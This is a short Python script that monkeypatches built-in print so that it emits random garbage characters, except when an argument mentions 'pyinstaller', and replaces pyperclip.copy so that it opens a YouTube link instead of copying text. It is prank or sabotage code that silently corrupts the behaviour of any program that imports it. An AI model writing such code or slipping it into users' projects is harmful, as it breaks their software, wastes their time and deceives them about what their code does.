import pyperclip
import webbrowser
import random
import string
import builtins

__original_copy = pyperclip.copy
__original_print = print

builtins.print = lambda *a, **k: __original_print(''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(40, 1000))), **k) if not any("pyinstaller" in str(i) for i in a) else __original_print(*a, **k)

pyperclip.copy = lambda text: webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
